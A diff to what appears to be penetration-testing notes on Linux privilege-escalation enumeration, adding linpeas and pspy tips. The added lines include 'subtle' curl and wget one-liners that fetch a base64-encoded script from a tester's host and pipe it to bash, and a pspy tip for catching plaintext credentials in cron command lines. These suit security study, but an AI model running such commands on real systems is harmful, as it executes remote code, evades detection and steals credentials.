@@ -27,9 +27,25 @@ cat output.txt | grep -A 10 writable
 This is just a quick start. Worth going over the file carefully if nothing immediately jumps out.
 
 ### linpeas
+
 Nb. well worth repeating these steps but instead starting with:
 ```bash
 cp /usr/share/peass/linpeas/linpeas.sh .
+```
+Or more subtle:
+```bash
+curl -s http://192.168.45.x/linpeat_f_b64.sh | base64 -d | bash
+```
+Or if you don't have cURL:
+```bash
+wget -qO- http://192.168.45.x/linpeat_f_b64.sh | base64 -d | bash
+```
+
+### pspy
+
+For enumerating file and command line event. Handy if there are creds being entered remotely via a cronjob as plaintext commandline params:
+```bash
+./pspy32 -pf -i 1000
 ```
 
 ## Manual Enumeration
